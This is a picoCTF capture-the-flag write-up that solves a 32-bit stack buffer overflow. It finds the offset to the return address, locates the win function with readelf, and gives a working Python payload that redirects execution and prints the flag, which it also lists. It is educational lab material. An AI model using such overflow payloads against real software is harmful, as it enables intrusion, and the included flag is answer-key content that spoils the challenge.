# buffer overflow 1
## Question
>Okay now you're cooking! This time can you overflow the buffer and return to the flag function in this [program](files/vuln)? You can find it in `/problems/buffer-overflow-1_1_8a16ff6a1b3cfb2e42c08d9090051a5d` on the shell server. [Source](files/vuln.c).

## Hint
>This time you're actually going to have to control that return address!

>Make sure you consider Big Endian vs Little Endian.

# Solution
Let's see what the code looks like. Below is the `main` function:

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

It doesn't take any argument but prompts for a string and calls the `vuln` function. This latest stores this string to a buffer with a size of 32 bytes, using `gets`, which is a bad idea. Then, it displays the memory address where it landed.

```c
void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}
```

Now, we have a function calls `win` that displays the flag:

```c
void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}
```

At this stage, it is obvious that we have to overflow the buffer to call the `win` function. Let's test the executable.

~~~~
$ ./vuln 
Please enter your string: 
whatever
Okay, time to return... Fingers Crossed... Jumping to 0x80486b3
$ python -c "print 'A'*32" | ./vuln 
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80486b3
$ python -c "print 'A'*44" | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x8048600
Segmentation fault (core dumped)
$ python -c "print 'A'*48" | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x41414141
Segmentation fault (core dumped)
~~~~

OK, let's get the address of the `win` function:
~~~~
$ readelf -s vuln
[SNIP]
65: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@@GLIBC_
66: 080486d0    93 FUNC    GLOBAL DEFAULT   14 __libc_csu_init
67: 080485cb   100 FUNC    GLOBAL DEFAULT   14 win
68: 00000000     0 FUNC    GLOBAL DEFAULT  UND setvbuf@@GLIBC_2.0
69: 00000000     0 FUNC    GLOBAL DEFAULT  UND fopen@@GLIBC_2.1
70: 0804a044     0 NOTYPE  GLOBAL DEFAULT   26 _end
[SNIP]
~~~~

Now that we know that the `win` function is located at memory address `0x080485cb`, we can write our payload. We can use python for that:
~~~~
$ python
Python 2.7.12 (default, Oct  8 2019, 14:14:10) 
[GCC 5.4.0 20160609] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import struct
>>> print repr(struct.pack('<I', 0x080485cb))
'\xcb\x85\x04\x08'
~~~~

Note: the code above returns a bytes object containing the value `0x80485cb` packed as unsigned int (`I`) in little endian (`<`).

OK, now let's exploit:
~~~~
$ python -c "import struct; print 'A'*44 + struct.pack('<I', 0x080485cb)" | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80485cb
picoCTF{addr3ss3s_ar3_3asy14941911}Segmentation fault (core dumped)
~~~~

# Flag
`picoCTF{addr3ss3s_ar3_3asy14941911}`
